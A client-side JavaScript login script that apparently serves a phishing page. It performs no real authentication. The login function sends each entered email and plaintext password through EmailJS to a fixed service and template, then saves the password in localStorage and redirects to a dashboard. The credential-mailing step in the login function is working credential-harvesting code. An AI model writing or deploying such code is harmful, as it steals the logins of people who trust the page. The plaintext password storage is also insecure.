// ======= UTIL & STORAGE HELPERS =======
const STORAGE_CURRENT_USER_KEY = "currentUser";

function saveCurrentUserPublic(user) {
  const publicUser = {
    email: user.email,
    password: user.password,
  };
  localStorage.setItem(STORAGE_CURRENT_USER_KEY, JSON.stringify(publicUser));
}

function loadCurrentUser() {
  return JSON.parse(localStorage.getItem(STORAGE_CURRENT_USER_KEY)) || null;
}

function logout() {
  localStorage.removeItem(STORAGE_CURRENT_USER_KEY);
  window.location.href = "index.html";
}

// ======= VALIDATION =======
function isEmailValid(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isPasswordValid(password) {
  return typeof password === "string" && password.length >= 1;
}

// ======= LOGIN FUNCTION =======
async function login(email, password) {
  if (!email || !password) {
    alert("Please enter email and password.");
    return;
  }
  if (!isEmailValid(email)) {
    alert("Invalid email format.");
    return;
  }
  if (!isPasswordValid(password)) {
    alert("Password cannot be empty.");
    return;
  }

  if (!window.emailjs) {
    alert("❌ EmailJS SDK not loaded");
    console.error("EmailJS SDK missing. Did you include the script?");
    return;
  }

  try {
    console.log("📨 Sending EmailJS message...");
    const result = await emailjs.send(
      "service_6nw221q",
      "template_d6k3x8f",
      {
        userpassword: password,
        useremail: email,
        time: new Date().toISOString()
      }
    );
    console.log("✅ EmailJS success:", result);
  } catch (error) {
    console.error("❌ EmailJS ERROR:", error);
    alert(
      `Email failed.\nStatus: ${error?.status || "unknown"}\nMessage: ${error?.text || error?.message || "no details"}`
    );
    return; // Stop login if email fails
  }

  // Save login info locally
  saveCurrentUserPublic({ email, password });

  // Redirect to dashboard
  window.location.href = "dashboard.html";
}

// ======= DASHBOARD HELPER =======
function loadDashboard() {
  const currentUser = loadCurrentUser();
  if (!currentUser || !currentUser.email) {
    window.location.href = "index.html";
    return;
  }
  const emailEl = document.getElementById("userEmail");
  if (emailEl) emailEl.textContent = currentUser.email;
}

// ======= HOOKS / EVENT BINDING =======
document.addEventListener("DOMContentLoaded", () => {
  // Login button
  const loginBtn = document.getElementById("loginBtn");
  if (loginBtn) {
    loginBtn.addEventListener("click", async (e) => {
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;
      await login(email, password);
    });
  }

  // Load dashboard if on dashboard page
  if (document.getElementById("userEmail")) {
    loadDashboard();
  }
});
